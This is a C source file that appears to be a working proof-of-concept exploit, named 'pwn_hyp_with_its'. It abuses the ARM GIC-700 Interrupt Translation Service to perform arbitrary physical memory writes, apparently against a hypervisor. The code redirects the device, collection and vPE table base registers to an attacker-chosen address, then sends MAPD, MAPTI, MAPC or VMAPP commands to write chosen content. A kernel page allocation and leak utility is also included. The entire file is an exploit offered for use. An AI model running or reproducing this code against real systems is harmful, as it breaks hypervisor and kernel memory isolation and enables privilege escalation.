#include "its.h"
#include "util.h"

#define GIC700_BASE		(0x09228000UL)
#define GIC700_ITS_BASE		(0x09268000UL)

#define PWN_PA			(0x95210000UL)
#define CONTENT			(0x345678FFFUL)

unsigned long gic700_addr = GIC700_BASE;
unsigned long its_addr = GIC700_ITS_BASE;

static void its_write_mem_through_mapd(unsigned long pwn_pa, unsigned long content)
{
	unsigned long mmio_reg_pa, second_level_table_pa;
	unsigned long gits_device_table_baser = its_get_device_table_baser(&mmio_reg_pa);
	unsigned long device_table_pa = GITS_BASER_ADDR_48_to_52(gits_device_table_baser); 

	if (!(gits_device_table_baser & GITS_BASER_VALID)) {
		fprintf(stderr, "ERROR: device table not configured in ITS\n");
		return;
	}

	if (!(gits_device_table_baser & GITS_BASER_INDIRECT)) {
		printf("[*] Found direct layout in the device table\n");
		printf("[*] Patching GITS_BASER device table address:0x%lx with 0x%lx\n", device_table_pa, pwn_pa);

		/* Replace the GITS_BASER address with the pwn pa and write to the register */
		gits_device_table_baser ^= device_table_pa;
		gits_device_table_baser |= GITS_BASER_PHYS_52_to_48(pwn_pa);

		write_memory(mmio_reg_pa, &gits_device_table_baser, sizeof(gits_device_table_baser));
	} else {
		/* Read the location of the 2nd level table
		 * Note: this also relies on the fact that the host kernel
		 * already did the allocation for this table. To trigger this,
		 * at least one device should register to receive MSIs
		 */
		read_memory(device_table_pa, &second_level_table_pa, sizeof(second_level_table_pa));
		if (!second_level_table_pa) {
			fprintf(stderr, "ERROR: indirect device table layout with no 2nd lvl");
			return;
		}
		printf("[*] Found indirect layout in the device table\n");
		printf("[*] Patching the entry into the 1st level table\n");
		printf("    to point to 2nd level table:0x%lx with pwn_pa 0x%lx\n",
                       second_level_table_pa, pwn_pa);

		/* Set the location where to write */
		pwn_pa |= (1UL << 63);
		write_memory(device_table_pa, &pwn_pa, sizeof(pwn_pa));
	}

	/* Send the command to ITS to write to the pwn_pa address 'content' */
	its_send_mapd(0, content);
	printf("[*] Sent MAPD to create a DTE entry at offset 0\n");
}

static void its_change_device_table_layout(int direct)
{
	unsigned long mmio_reg_pa, gits_device_table_baser;

	gits_device_table_baser = its_get_device_table_baser(&mmio_reg_pa);
	if (!(gits_device_table_baser & GITS_BASER_INDIRECT)) {
		if (direct) {
			printf("[*] Device Table already has direct layout\n");
			return;
		} else {
			gits_device_table_baser |= GITS_BASER_INDIRECT;
			printf("[*] Device Table layout updated to indirect\n");
		}
	} else {
		if (direct) {
			gits_device_table_baser &= ~GITS_BASER_INDIRECT;
			printf("[*] Device Table layout updated to direct\n");
		} else {
			printf("[*] Device Table already has an indirect layout\n");
			return;
		}
	}

	write_memory(mmio_reg_pa, &gits_device_table_baser, sizeof(gits_device_table_baser));
}

static void its_write_mem_through_mapti(unsigned long pwn_pa, unsigned long content)
{
	/* 1. Send a MAPD command to create an DTE entry that points to pwn_pa as the ITT address */
	printf("[*] Send MAPD to associate deviceId 0 with ITT at 0x%lx\n", pwn_pa);
	its_send_mapd(0, pwn_pa | (1UL << 63));

	printf("[*] Send MAPTI to create an ITE entry\n");

	/* 2. Write to the ITT entry through MAPTI */
	its_send_mapti(content);
}

static void its_write_mem_through_mapc(unsigned long pwn_pa, unsigned long content)
{
	unsigned long mmio_reg_pa, gits_collection_table_baser;
	unsigned long gits_collection_table_pa, second_level_table_pa;

	gits_collection_table_baser = its_get_collection_table_baser(&mmio_reg_pa);
	gits_collection_table_pa = GITS_BASER_ADDR_48_to_52(gits_collection_table_baser);

	if (!(gits_collection_table_baser & GITS_BASER_INDIRECT)) {
		printf("[*] Collection Table has direct layout\n");

		gits_collection_table_baser ^= gits_collection_table_pa;
		gits_collection_table_baser |= GITS_BASER_PHYS_52_to_48(pwn_pa);

		printf("[*] Replace collection table from 0x%lx with 0x%lx\n", gits_collection_table_pa, pwn_pa);
		printf("[*] Write at MMIO 0x%lx 0x%lx\n", mmio_reg_pa, gits_collection_table_baser);
		its_set_power(0);

		write_memory(mmio_reg_pa, &gits_collection_table_baser, sizeof(gits_collection_table_baser));

		its_set_power(1);

	} else {
		printf("[*] Collection Table has an indirect layout\n");

		read_memory(gits_collection_table_pa, &second_level_table_pa, sizeof(gits_collection_table_pa));

		printf("[*] Patch 1st level entry from 0x%lx to 0x%lx\n", second_level_table_pa, pwn_pa);

		write_memory(gits_collection_table_pa, &pwn_pa, sizeof(pwn_pa));
	}

	printf("[*] Send MAPC command to create a CTE with the content 0x%lx\n", content);
	its_send_mapc(content);
}

static void its_write_mem_through_vmapp(unsigned long pwn_pa, unsigned long content)
{
	unsigned long mmio_reg_pa, gits_vpe_table_baser;
	unsigned long gits_vpe_table_pa;

	gits_vpe_table_baser = its_get_vpe_table_baser(&mmio_reg_pa);
	gits_vpe_table_pa = GITS_BASER_ADDR_48_to_52(gits_vpe_table_baser);

	if (!(gits_vpe_table_baser & GITS_BASER_VALID))
		printf("[*] vPE table not configured\n");

	if (gits_vpe_table_baser & GITS_BASER_INDIRECT) {
		printf("[*] vPE table indirect layout but not anymore !\n");
		gits_vpe_table_baser ^= GITS_BASER_INDIRECT;
	}

	printf("[*] vPE baser 0x%lx\n", gits_vpe_table_baser);
	gits_vpe_table_baser ^= gits_vpe_table_pa;
	gits_vpe_table_baser |= GITS_BASER_PHYS_52_to_48(pwn_pa);

	printf("[*] Write vPE reg 0x%lx to 0x%lx\n", mmio_reg_pa, gits_vpe_table_baser);
	its_set_power(0);

	write_memory(mmio_reg_pa, &gits_vpe_table_baser, sizeof(gits_vpe_table_baser));
	its_set_power(1);

	printf("[*] Set vPE table direct layout\n");
	printf("[*] Set vPE table addr: 0x%lx\n", pwn_pa);

	printf("[*] Send VMAPP command to create a vPE entry\n");
	its_send_vmapp(content);
	its_send_vinvall(0);
	its_send_vsync(0);
}

static void print_usage(void)
{
	printf("./pwn_hyp_with_its -{method} -g {gic700 addr OPTIONAL}\n"
	       "                   -i {its addr OPTIONAL}\n"
	       "                   -a {address to write to}\n"
               " Content:\n"
	       "                   -w {8 byte word}\n\n"
	       "Method is one of:\n"
	       "0 - use MAPD\n"
	       "1 - change device table layout to direct\n"
               "2 - change device table layout to indirect\n"
               "3 - write memory through MAPTI\n"
               "4 - write memory through MAPC\n"
	       "5 - write memory through VMAPP\n"
	       "\n\nUtils:\n"
	       "l - allocate & leak one kernel page\n");
}

int main(int argc, char **argv)
{
	int opt, mode = 0;
	unsigned long write_addr = PWN_PA, content = CONTENT;
	unsigned long data = 0;

	while ((opt = getopt(argc, argv, "012345ha:i:g:w:l")) != -1) {
		switch (opt) {
		case '0':
			mode = 0;
			break;
		case '1':
			mode = 1;
			break;
		case '2':
			mode = 2;
			break;
		case '3':
			mode = 3;
			break;
		case '4':
			mode = 4;
			break;
		case '5':
			mode = 5;
			break;
		case 'g':
			gic700_addr = strtoul(optarg, NULL, 0);
			break;
		case 'i':
			its_addr = strtoul(optarg, NULL, 0);;
			break;
		case 'a':
			write_addr = strtoul(optarg, NULL, 0);;
			break;
		case 'w':
			content = strtoul(optarg, NULL, 0);;
			break;
		case 'l':
//			unsigned long p = allocate_kernel_page();
//			unsigned long addr = 0x8af00000;
			printf("[*] Allocate page at: 0x%lx\n", allocate_kernel_page());
//			for (int i = 0; i < 512; i++) {
//				addr |= 0x7fd;
//				write_memory(p, &addr, sizeof(addr));
//				p += 8;
//				addr += (1UL << 21);
//			}
//
			return 0;
		case '?':
		case 'h':
			print_usage();
			return 1;
		default:
			fprintf(stderr, "ERROR: unknown arg %c\n", opt);
			return 0;
		}
	}

	printf("[*] Using GIC700 at : 0x%lx\n", gic700_addr);
	printf("[*] Using ITS at : 0x%lx\n", its_addr);
	printf("[*] Write at: 0x%lx content: 0x%lx using mode:%d\n",
               write_addr, content, mode);

	if (write_addr == PWN_PA)
		write_memory(write_addr, &data, sizeof(data));

	if (!mode)
		its_write_mem_through_mapd(write_addr, content);
	else if (mode == 1)
		its_change_device_table_layout(1);
	else if (mode == 2)
		its_change_device_table_layout(0);
	else if (mode == 3)
		its_write_mem_through_mapti(write_addr, content);
	else if (mode == 4)
		its_write_mem_through_mapc(write_addr, content);
	else if (mode == 5)
		its_write_mem_through_vmapp(write_addr, content);

	if (write_addr == PWN_PA) {
		read_memory(write_addr, &data, sizeof(data));
		printf("[*] Patched value: 0x%lx at pwn_pa 0x%lx\n", data, write_addr);
	}

	cleanup();
	return 0;
}
